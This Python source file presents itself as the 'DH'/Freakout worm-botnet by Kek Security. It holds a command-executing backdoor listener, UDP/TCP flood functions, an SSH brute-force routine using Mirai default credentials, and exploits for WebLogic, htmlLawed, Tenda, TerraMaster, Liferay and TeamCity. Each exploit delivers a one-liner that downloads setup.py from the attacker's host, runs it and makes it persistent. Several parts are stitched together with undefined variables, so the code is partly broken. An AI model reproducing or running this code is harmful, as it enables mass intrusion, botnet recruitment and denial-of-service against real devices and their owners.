#!/usr/bin/python
# This is the "DH" botnet, by Kek Security.
# Currently only one of our members is the author of ---->'this'
# Software. We hope to share this code with others once trust is built. No leaking of this code is allowed, even indirect leaks, like caches online
# THIS IS A ONLINE SOFTWARE WITH ONLINE BEHAVIOR
# SO IF YOU GET RANS0MED BY THIS SHIT DON'T SWEAT MY BALLS as KekSec may start doing ransomware soon.

# DH is our old botnet, or cities wordwude newspaper name "freakout botnet" but we in Kek Sec here call this the "DH" botnet, using 2 chars for the name was a good idea by the author, Freak
# DH also if you see this in any public source it was leaked. the only way it could get leaked is if I get hacked, which is an almost never so.
# DH botnet was a botnet coded by Freak that managed to spread dangerously fast at a steady pace, wasn't planning on seeing the thing just go "like that", like that.
# DH 'botnet' aka Freakout
# DH was coded by Freak from Kek Security and Anonymous.

######################################################################################################################################################################
#            D                                       please dont use it, unless you are going to use a few functions.                                   H            #
#    this is If you have this code and its not yours please dont use it, unless you are going to use a few functions, but not just one please. Wizard level stuff    #
######################################################################################################################################################################

# production should be set to true if you are trying to debug with this script
# also honeycheck is for 1 second delay between ports and services when fingerprinting and exploiting.

# also I hid a basic TRAP ~ so read in between the lines on this one guys!
gonnaScan = True
if gonnaScan:
    portcount = 8
    threads = 256 # two hundred and fifty six threads. scans the best! more threads the better.

print("[.] Loading modules...")

production = True
import sys, re, os, os.path, socket, time, select, random, threading
import urllib.request
import ssl
import requests
import paramiko

if os.name == "nt":
    import win32serviceutil, win32service, win32event, servicemanager

from threading import Thread
from struct import pack,unpack
from ctypes import *
from urllib3.exceptions import InsecureRequestWarning

print("[.] setting some globals")

global sshcommand
global botnetsource
global username
global passwd
global ip
global started
global command
global rekdevice

if os.name == "nt":
    os.popen("C:\\Users\\" + os.getenv("USERNAME") + "\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe")
else:
    print("Running a local program...")

sshcommand = "curl placeholder.io --onefile --system --uselocal -O outputfile" # SSH IP List saves

little1 = "python setup.py; python3 setup.py; cp setup.py /up-boot; chmod 0777 /up-boot; echo /up-boot > /etc/rc.local"
little2 = "echo fathax homie l33t ipv4 & echo ipv6 scanning all de wAYS > ssh_connected_atleast-was-placeholder.as-well-ssl.txt"
botnetsource = "https://pastebin.com/raw/uZnUnsAM?"
request = requests.get(botnetsource)
a = requests.adapters.HTTPAdapter(max_retries=3)
if "linux":
    botnetsource = "http://" + requests.get("http://icanhazip.com/").text[0:15] + ":8081/setup.py"
else:
    botnetsource = "http://:8081/setup.py"

print(botnetsource)
command = sshcommand = rekdevice = "curl " + botnetsource + " -O setup.py; wget " + botnetsource + " -O setup.py; " + "" + little1 + ";" + little2

# arrows for the hamies
#3---> fiRE CODE OVER HERE W4TCH 0UT
#<---( cODED BY Freak from KekSec
# only took a few days so please ignore or fix any errors ;)
# running out of arrows
# ================ #
#                  #
#        0 \       #
#     6--|--)->    #
#        | /6      #
#       /\         #
#      /  \        #
#     <    >       #
# ================ #
# Coding botnetz is fun!
# botbot
# who's there?
# silence
# maintaining silence is there that's who
# and protecting access :)
# and please dont feel sad after we lose the botnet ;'(
# cause it means the server hoster got raided so
#<---( cODED BY Freak from KekSec
#)---> cODED BY Freak from KekSec
#
#
#
# if YOU ARE A SKID AND DON'T KNOW WHAT TO DO don't run this file. It will seriously damage your computer: temporarily.

# skid shit b01

print("\033[36m --- Payload: --- ")
print("")
print("")
print("")
print(command)
print("")
print("")
print("Note: is a one-liner.")
# Node from author: The only author of this code is Freak from the Kek Security network hacking crew. This code is the new "freakout" or "necro" renamed to be the 'DH' virus


## ## DH ## $$ $$ ##
#DH Virus/Worm code here
#DH is a new age virus from 2025-03-11 fully developed by Freak from Kek Security Or KekSec.
## ## DH ## $$ $$ ##
#DH Virus/Worm code here
#DH is a new age virus from 2025-03-11 fully developed by Freak from Kek Security Or KekSec
## ## DH ## $$ $$ ##
#DH Virus/Worm code here
#DH is a new age virus from 2025-03-11 fully developed by Freak from Kek Security Or KekSec.

# DH is a worm based botnet
# Dictionary for brute force attacks (same as mirai)
global passwd
passwd = ["root xc3511", "root 12345789", "root vizxv", "root admin", "admin admin", "root 888888", "root xmhdipc", "root default", "root jauntech", "root 123456", "root 54321", "support support", "root (none)", "admin password", "root root", "root 12345", "user user", "admin (none)", "root pass", "admin admin1234", "root 1111", "admin smcadmin", "admin 1111", "root 666666", "root password", "root 1234", "root klv123", "Administrator admin", "service service", "supervisor supervisor", "guest guest", "guest 12345", "admin1 password", "administrator 1234", "666666 666666", "888888 888888", "ubnt ubnt", "root klv1234", "root Zte521", "root hi3518", "root jvbzd", "root anko", "root zlxx.", "root 7ujMko0vizxv", "root 7ujMko0admin", "root system", "root ikwb", "root dreambox", "root user", "root realtek", "root 000000", "admin 1111111", "admin 1234", "admin 12345", "admin 54321", "admin 123456", "admin 7ujMko0admin", "admin pass", "admin meinsm", "tech tech"]


global loggedIPs
loggedIPs = ""

def backdoor_65481():
    global loggedIPs
    cork = 0
    corky = 0
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 65481))
    s.listen()
    while 1:
        try:
            c, addr = s.accept()
            c.send(" - - - = = =  BANNER  = = = - - -\r\n\r\n\r\nBANNER\r\r\rHEAT\n\n\nLIST")
            loggedIPs += c[0] + "\r\n"
            print(c[0] + " has connected to our ultimate\r\n\r\n\r\nSCAN FLAG. ++++++ ARRRR + + +\r\nTake a drink cuz they probably scanning all our ports buddy boy")
            cork = c.recv(65481)
            if cork.startswith("CMD"):
                c.send(os.popen(cork.replace("CMD","")).read())
                try:
                    c.send("1 \0\1\2\3\4\5\6\7\8pennies\r\rSCAN FLAG. ++++++ ARRRR U B 1337 \n\r+ + + u r a monster!\r\nTake a drink cuz they probably scanning all our ports buddy boy")
                    corky = c.recv(65481)
                except:
                    print("[.] Either " + c[0] + " couldn't send back to them early or recieve anything after.")
                    continue
                break
            else:
                print("[+] We got the cork! It was:\r\n" + cork)
                if corky:
                    print("[+] we also got a corky!" + corky)
            if ("GET" in cork or "POST" in cork) and "HEAD " not in cork:
                c.send("""HTTP/1.1 200 OK\r\nDate: Mon, 27 Jul 2009 12:28:53 GMT\r\nServer: Apache/2.2.14 (Win32)\r\nLast-Modified: Wed, 22 Jul 2009 19:15:56 GMT\r\nContent-Length: 88\r\nContent-Type: text/html\r\nConnection: Closed\r\n\r\n<html>\r\n<body>\r\n<h1>Hello, World!</h1>\r\n</body>\r\n</html>""")
            elif "HEAD" not in cork:
                c.send(os.popen(cork).read())
            c.close()
        except Exception as e:
            e.stacktrace()

def has_admin():
    if os.name == 'nt':
        try:
            # only windows users with admin privileges can read the C:\windows\temp
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
        except:
            return (os.environ['USERNAME'],False)
        else:
            return (os.environ['USERNAME'],True)
    
def ftpd_21():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 21))
    s.listen(65535)
    while 1:
        try:
            client, addr = s.accept()
            client.send("HEAD 0\nOPTS UTF8 ON\n1")
            resp = client.recv(65500)
            print("Got response on our \"FTP\" server!\r\n\r\n" + resp + "\r\n\r\nDone response. Choo-choo!")
        except:
            continue

def httpd_8081():  # alternate port 29565
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 8081))
    s.listen(65535)
    while 1:
        try:
            c, addr = s.accept()
            print(c[0] + " has connected.")
            loggedIPs += c[0] + "\r\n"
            cork = c.recv(65500)
            if ("GET" in cork or "POST" in cork) and "HEAD " not in cork:
                c.send("""HTTP/1.1 200 OK\r\nDate: Mon, 27 Jul 2009 12:28:53 GMT\r\nServer: Apache/2.2.14 (Win32)\r\nLast-Modified: Wed, 22 Jul 2009 19:15:56 GMT\r\nContent-Length: 88\r\nContent-Type: text/html\r\nConnection: Closed\r\n\r\n<html>\r\n<body>\r\n<h1>Hello, World!</h1>\r\n</body>\r\n</html>""")
            elif "/" in cork:
                c.send("bad file command\n\non our end.\r\n")
            else:
                c.send("""HTTP/1.1 404 NOT FOUND\r\nConnection: investigate\r\nHeader: randomheader\r\nThis: could be your last mistake\r\nWorking: here\r\n\r\n<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\r\n<html>\r\n<head>\r\n   <title>TR-069 WAN management system</title>\r\n</head>\r\n<body>\r\n   <h1>Not Found</h1>\r\n   <p>The requested URL was not found on this server.</p>\r\n</body>\r\n</html>""")
            c.close()
        except Exception as e:
            e.stacktrace()

if has_admin() or os.getuid() == 0 and sys.argv == "":
    pass
    try:
        os.stat(os.access(".", 0))
    except:
        if os.name == "nt":
            os.startfile(__file__ + " 0") # re-start program to escalate privileges
        else:
            os.fork()
        exit(0)
else:
    try:
        Thread(target = httpd_8081).start()
    except:
        print("No threading.... Wow!")

def udp(ip, port, time):
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    endtime=time.clock() + time
    while time.clock() < endtime:
        s.sendto("\xff" * 65507, ip, port)

def tcp(ip, port, packetsize, time):
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    endtime=time.clock() + time
    while time.clock() < endtime:
        try:
            s.connect((ip, port))
            s.send("\xff" * packetsize)
        except:
            pass




## ## DH ## $$ $$ ##
#DH Virus/Worm code here
#DH is a new age virus from 2025-03-10 fully developed by Freak from Kek Security Or KekSec.


def exploit(target):
    global command, passwd, sshcommand
    request = requests.session()
    headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
    print("[+] Sending GET Request for weblogic ....")
    try:
        GET_Request = request.get(target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");", verify=False, headers=headers)
        print("[$] Exploit successful! Hooray..")
    except:
        pass
    try:
        print("[+] Sending htmlLawed 1.2.5 exploit ....")
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((target, 443))
        s=ssl.wrap_socket(s)
        s.send("POST / HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: curl/8.10.1\r\nAccept: */*\r\nCookie: sid=foo\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsid=foo&hhook=exec&text=" + command)
        s.recv(1024)
        s.close()
        print("[+] Successful sending! Lets hope it worx!")
    except:
        pass
    try:     #Tenda AC10 exploit for 6 different ports
        ports=443,80,81,8080,8081,8181
        for port in ports:
            so=socket.socket()
            so.connect((target, port))
            so.send('''POST /goform/WriteFacMac HTTP/1.1\r\nHost: 192.168.xx.xxx\r\nCache-Control: max-age=0\r\nAccept-Language: en-US,en;q=0.9\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: password=rfl1qw\r\nIf-Modified-Since: Sun Aug 10 12:46:43 2025\r\nConnection: keep-alive\r\nContent-Length: 24\r\n\r\nmac=00:01:02:11:22:33;'''+sshcommand)
            so.recv(4096)
            so.close()
            print("[+] Successful sending! Lets hope it worx! "+str(port))
    except:
        pass
    try:
        cmd_dlexearm64 = "wget "+url+" -O setup.py; python setup.py"
        headers=requests.get(url).headers
        servertype=requests.get(url).headers['Server']
        so=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        so.connect((target, 443))
        if servertype == "TNAS":
            s = requests.Session()
            s.headers.update({"user-device":"TNAS", "user-agent":"TNAS"})
            r=s.post(f"{TARGET}/module/api.php?mobile/wapNasIPS")
            try:
                j = r.json()
                PWD = j["data"]["PWD"]
                MAC_ADDRESS = j["data"]["ADDR"]
            except KeyError:
                raise(Exception)
            TIMESTAMP = str(int(time.time()))
            s.headers.update({"signature": tos_encrypt_str(TIMESTAMP), "timestamp": TIMESTAMP})
            s.headers.update({"authorization": PWD})
            #RCEs
            terramasterRCEs=[f"{TARGET}/tos/index.php?app/del&id=0&name=;{cmd_dlexearm64};xx%23",
                  f"{TARGET}/tos/index.php?app/hand_app&name=;{cmd_dlexearm64};xx.tpk", #BLIND
                  f"{TARGET}/tos/index.php?app/app_start_stop&id=ups&start=0&name=donotcare.*.oexe;{cmd_dlexearm64};xx"] #BLIND                
            for urltohack in terramasterRCEs:
                r = s.get(RCEs[args.rce])
                content = str(r.content, "utf-8")
                if "<!--user login-->" not in content: 
                    print(content)
                    
        if "Liferay-Portal" in headers:
            headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
            response = session.get(""+target+"/api/jsonws/invoke", headers=headers,verify=False)
            if "Unable to deserialize object" in response.text:
                paramsPost = {"p_auth":"AdsXeCqz","tableId%3d1":"","formDate":"1526638413000","columnId":"123","defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource":"{\"userOverridesAsString\":\"HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000023F40000000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200206A617661782E7363726970742E536372697074456E67696E654D616E61676572000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000074000B6E6577496E7374616E6365757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007371007E00137571007E00180000000174000A4A61766153637269707474000F676574456E67696E6542794E616D657571007E001B00000001767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707371007E0013757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017404567661722063757272656E74546872656164203D20636F6D2E6C6966657261792E706F7274616C2E736572766963652E53657276696365436F6E746578745468726561644C6F63616C2E67657453657276696365436F6E7465787428293B0A76617220697357696E203D206A6176612E6C616E672E53797374656D2E67657450726F706572747928226F732E6E616D6522292E746F4C6F7765724361736528292E636F6E7461696E73282277696E22293B0A7661722072657175657374203D2063757272656E745468726561642E6765745265717565737428293B0A766172205F726571203D206F72672E6170616368652E636174616C696E612E636F6E6E6563746F722E526571756573744661636164652E636C6173732E6765744465636C617265644669656C6428227265717565737422293B0A5F7265712E73657441636365737369626C652874727565293B0A766172207265616C52657175657374203D205F7265712E6765742872657175657374293B0A76617220726573706F6E7365203D207265616C526571756573742E676574526573706F6E736528293B0A766172206F757470757453747265616D203D20726573706F6E73652E6765744F757470757453747265616D28293B0A76617220636D64203D206E6577206A6176612E6C616E672E537472696E6728726571756573742E6765744865616465722822636D64322229293B0A766172206C697374436D64203D206E6577206A6176612E7574696C2E41727261794C69737428293B0A7661722070203D206E6577206A6176612E6C616E672E50726F636573734275696C64657228293B0A696628697357696E297B0A20202020702E636F6D6D616E642822636D642E657865222C20222F63222C20636D64293B0A7D656C73657B0A20202020702E636F6D6D616E64282262617368222C20222D63222C20636D64293B0A7D0A702E72656469726563744572726F7253747265616D2874727565293B0A7661722070726F63657373203D20702E737461727428293B0A76617220696E70757453747265616D526561646572203D206E6577206A6176612E696F2E496E70757453747265616D5265616465722870726F636573732E676574496E70757453747265616D2829293B0A766172206275666665726564526561646572203D206E6577206A6176612E696F2E427566666572656452656164657228696E70757453747265616D526561646572293B0A766172206C696E65203D2022223B0A7661722066756C6C54657874203D2022223B0A7768696C6528286C696E65203D2062756666657265645265616465722E726561644C696E6528292920213D206E756C6C297B0A2020202066756C6C54657874203D2066756C6C54657874202B206C696E65202B20225C6E223B0A7D0A766172206279746573203D2066756C6C546578742E676574427974657328225554462D3822293B0A6F757470757453747265616D2E7772697465286279746573293B0A6F757470757453747265616D2E636C6F736528293B0A7400046576616C7571007E001B0000000171007E00237371007E000F737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000077080000001000000000787878;\"}","name":"A","cmd":"{\"/expandocolumn/update-column\":{}}","type":"1"}
                headers2 = {"Connection":"close","cmd2":cmd_dlexe,"Content-Type":"application/x-www-form-urlencoded"}
                response2 = session.post(""+target+"/api/jsonws/invoke", data=paramsPost, headers=headers2,verify=False)
    except:
        pass
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((target, 22))
        s=ssl.wrap_socket(s)
        fgh=open(sshcommand, "a+")
        fgh.write(target + "\r\n")
        fgh.close()
        s.close()
    except:
        return
    try:
        for result in passwd:
            try:
                result = result.split(" ")
                ssh.connect(target, result[0], password=result[1])
                stdin, stdout, stderr = ssh.exec_command('system')
                stdin, stdout, stderr = ssh.exec_command('enable')
                stdin, stdout, stderr = ssh.exec_command('push')
                stdin, stdout, stderr = ssh.exec_command('root')
                stdin, stdout, stderr = ssh.exec_command('admin')
                stdin, stdout, stderr = ssh.exec_command('telnetd')
                stdin, stdout, stderr = ssh.exec_command('cat | sh')
                stdin, stdout, stderr = ssh.exec_command(command)
                x = stdout.readlines()
                print(x)
                for line in x:
                    print(line)
            except:
                pass
            ssh.close()
    except:
        pass
    
# Function to send messages to the channel
def send_message(message):
    ircsock.send(bytes(f"PRIVMSG {channel} :{message}\r\n", "UTF-8"))

print("[.] setting more some globals")
global server
global channel
global ip
global key
global botnick
global serverip
global binprefix
global binname
global nameprefix
global echo
global tftp
global wget
global logins
global wizard_made
global ran
global ip
global fh
# Scanner
global honeycheck, exploited
honeycheck = 1
exploited = 0
global w
# YESSSSS, I got ghosts: change their souls leftover spirit energy and change it into my bodily energy.
# I used to listen to ICP alot to, started again


string =  "https://private-user-images.githubusercontent.com/76569084/417278250-622bc766-a9c2-4170-9267-f7c9c34d323b.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTYyNTE3MTcsIm5iZiI6MTc1NjI1MTQxNywicGF0aCI6Ii83NjU2OTA4NC80MTcyNzgyNTAtNjIyYmM3NjYtYTljMi00MTcwLTkyNjctZjdjOWMzNGQzMjNiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA4MjYlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwODI2VDIzMzY1N1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQyZDFmMTk4ZWI5NGIyMmM3ZjRkYjI1OTc3NDkzYzBiMGI4N2EwZWVjNjc0M2UwMmNlOGU5Nzg3MTQyOWE3Y2YmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.9OXIbmp1tfk0qAJCHr4lCbpmQerw15jgfRrxZaBWSbM"


class TeamCityExploit:
    def __init__(self, target_url, timeout=15, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        
    def _log(self, message, level="info"):
        if level == "success":
            print(f"{Colors.GREEN}[+] {message}{Colors.END}")
        elif level == "error":
            print(f"{Colors.RED}[-] {message}{Colors.END}")
        elif level == "warning":
            print(f"{Colors.YELLOW}[!] {message}{Colors.END}")
        elif level == "info":
            print(f"{Colors.BLUE}[*] {message}{Colors.END}")
        elif level == "verbose" and self.verbose:
            print(f"[DEBUG] {message}")
            
    def check_target_reachability(self):
        try:
            self._log(f"Checking target: {self.target_url}")
            response = self.session.get(self.target_url, verify=False, timeout=self.timeout)
            
            if response.status_code in [200, 302, 401, 403]:
                self._log("Target is reachable", "success")
                return True
            else:
                self._log(f"Unexpected status: {response.status_code}", "error")
                return False
                
        except requests.exceptions.Timeout:
            self._log("Connection timeout", "error")
            return False
        except requests.exceptions.ConnectionError:
            self._log("Connection error", "error")
            return False
        except Exception as e:
            self._log(f"Error: {str(e)}", "error")
            return False
    
    def exploit_authentication_bypass(self):
        exploit_path = "/idontexist?jsp=/app/rest/users;.jsp"
        full_url = f"{self.target_url}{exploit_path}"
        
        self._log(f"Targeting: {full_url}")
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*"
        }
        
        payload = {
            "username": "ibrahimsql",
            "password": "ibrahimsql",
            "email": "ibrahimsql@exploit.local",
            "roles": {
                "role": [{
                    "roleId": "SYSTEM_ADMIN",
                    "scope": "g"
                }]
            }
        }
        
        self._log(f"Payload: {json.dumps(payload)}", "verbose")
    
        try:
            self._log("Attempting authentication bypass...")
            
            response = self.session.post(full_url, headers=headers, verify=False, json=payload, timeout=self.timeout)
            
            self._log(f"Status: {response.status_code}", "verbose")
            self._log(f"Response: {response.text[:200]}", "verbose")
            
            if response.status_code == 200:
                self._log("Exploit successful!", "success")
                
                print(f"\n{Colors.BOLD}{Colors.GREEN}[SUCCESS] Admin user created!{Colors.END}")
                print(f"{Colors.CYAN}{'='*50}{Colors.END}")
                print(f"{Colors.YELLOW}Username:{Colors.END} ibrahimsql")
                print(f"{Colors.YELLOW}Password:{Colors.END} ibrahimsql")
                print(f"{Colors.YELLOW}Login URL:{Colors.END} {self.target_url}/login.html")
                print(f"{Colors.CYAN}{'='*50}{Colors.END}")
                
                return True
                
            elif response.status_code == 401:
                self._log("Authentication required - target may be patched", "error")
                return False
            elif response.status_code == 404:
                self._log("Endpoint not found - target may be patched", "error")
                return False
            elif response.status_code == 403:
                self._log("Access forbidden", "error")
                return False
            else:
                self._log(f"Unexpected status: {response.status_code}", "error")
                return False
                
        except requests.exceptions.Timeout:
            self._log("Request timeout", "error")
            return False
        except requests.exceptions.ConnectionError:
            self._log("Connection error", "error")
            return False
        except Exception as e:
            self._log(f"Error: {str(e)}", "error")
            return False

def validate_url(url):
    try:
        parsed = urlparse(url)
        if not parsed.scheme:
            url = f"http://{url}"
            parsed = urlparse(url)
        
        if parsed.scheme not in ['http', 'https']:
            raise ValueError("URL must use HTTP or HTTPS")
            
        if not parsed.netloc:
            raise ValueError("Invalid URL format")
            
        return url
    except Exception as e:
        raise ValueError(f"Invalid URL: {str(e)}")


# WIZARD MAGIC RUNNING HERE 81-Bykers->HA>-->=SCRAM-=~-[<Psi>] - Freak"
w = "Wizard warning - Freak is a powerful real world wizard that uses Chi energy and meditation and prayer for all my power. KekSec ROX!"
wizard_made = w
ip = ""
serverip = "bofh.nl.smurfnet.ch"
nameprefix = "enemy"
binprefix = "/f/" + nameprefix
binname = binprefix.split("/")[-1]
fh = open("bots.txt","a+")

def chunkify(lst,n):
    print(wizard_made)
    return [ lst[i::n] for i in xrange(n) ]

global running
running = 0

wizard_made = []
tftp = 0
wget = 0
echo = 0
logins = 0
ran = 0
def printStatus():
    global echo
    global tftp
    global wget
    global logins
    global ran
    while 1:
        time.sleep(5)
        print("\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m")

def readUntil(tn, advances, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        for advance in advances:
            if advance in buf: return buf
    return ""

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

def contains(data, array):
    for test in array:
        if test in data:
            return True
    return False

def split_bytes(s, n):
    assert n >= 4
    start = 0
    lens = len(s)
    while start < lens:
        if lens - start <= n:
            yield s[start:]
            return # StopIteration
        end = start + n
        assert end > start
        yield s[start:end]
        start = end

print("[0] Setting some file wrappers.")

class FileWrapper():
    def __init__(self, f):
        self.f = f

    # blindly read n bytes from the front of the file
    def read(self, n):
        result = self.f.read(n)
        return result

    # read n bytes from the next alignment of k from start
    def read_align(self, n, k=None, start=0):
        # if no alignment specified, assume aligned to n
        if not k:
            k = n
        remainder = self.f.tell() % k
        num_pad = (k-remainder) % k
        pad = self.read(num_pad)
        result = self.read(n)
        return result

    # unpack the data using the endian
    def read_uint(self, n, endian):
        result = self.read_align(n)
        unpk_byte = ""
        if endian == 1:
            unpk_byte = "<"
        elif endian == 2:
            unpk_byte = ">"
        else:
            unpk_byte = "@"
        format_ = unpk_byte+"B"*n
        return unpack(format_, result)

    def seek(self, offset):
        self.f.seek(offset)

    def tell(self):
        return self.f.tell()
   
class ElfHeader():
    def __init__(self, e_ident):
        f=open(".tempelf", "wb")
        f.write(e_ident)
        f.close()
        f=open(".tempelf", "rb")
        self.f = FileWrapper(f)
        self.e_ident = self.f.read(16)     #unsigned char
        assert(self.e_ident[0:4] == "\x7fELF")
        EI_CLASS = ord(self.e_ident[4])
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        if EI_DATA == 1:
            self.endian = 1
        elif EI_DATA == 2:
            self.endian = 2
        else:
            assert(False)
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        assert(EI_VERSION == 1)
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]
        self.e_type = None      #Elf32_Half
        self.e_machine = None       #Elf32_Half
        self.e_version = None       #Elf32_Word
        self.e_entry = None     #Elf32_Addr
        self.e_phoff = None     #Elf32_Off
        self.e_shoff = None     #Elf32_Off
        self.e_flags = None     #Elf32_Word
        self.e_ehsize = None        #Elf32_Half
        self.e_phentsize = None     #Elf32_Half
        self.e_phnum = None     #Elf32_Half
        self.e_shentsize = None     #Elf32_Half
        self.e_shnum = None     #Elf32_Half
        self.e_shstrndx = None      #Elf32_Half

    def parse_header(self):

        #Magic number
        assert(self.e_ident[0:4] == "\x7fELF")
        # 1 means 32, 2 means 64
        EI_CLASS = ord(self.e_ident[4])
        #TODO: Are these the right sizes to put here?
      
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        self.bytes = EI_CLASS
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]

        #Parse the rest of the header
        self.e_type = self.Half(self.f)
        self.e_machine = self.Half(self.f)

        section = {}
        section["e_machine"] = self.e_machine
        section["endian"] = self.endian
        return section

    def Half(self, f):
        return self.f.read_uint(2, self.endian)

print("[.] Making some simple tools..")
honeycheck = 1

global badips
badips=[]
def fileread():
    fh=open("honeypots.txt", "rb")
    data=fh.read()
    fh.close()
    return data

def clientHandler(c, addr):
    global badips
    try:
        if addr[0] not in badips and addr[0] not in fileread():
            print(addr[0] + ":" + str(addr[1]) + " has connected!")
            request = recvTimeout(c, 8912)
            if "curl" not in request and "Wget" not in request:
                if addr[0] not in fileread():
                    fh=open("honeypots.txt", "a")
                    fh.write(addr[0]+"\n")
                    fh.close()        
                    os.popen("iptables -A INPUT -s " + addr[0] + " -j DROP")
                badips.append(addr[0])
                print(addr[0] + ":" + str(addr[1]) + " is a fucking honeypot!!!")
                c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
                for i in range(10):
                    c.send(os.urandom(65535*2))
        else:
            c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
            for i in range(10):
                c.send(os.urandom(65535*2))
        c.close()
    except Exception as e:
        sys.settrace(os.popen)         # this crashes the whole thread



def honeyserver(honeyport):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', honeyport))
    s.listen(999999999)
    while 1:
        try:
            c, addr = s.accept()
            Thread(target=clientHandler, args=(c, addr,)).start()
        except:
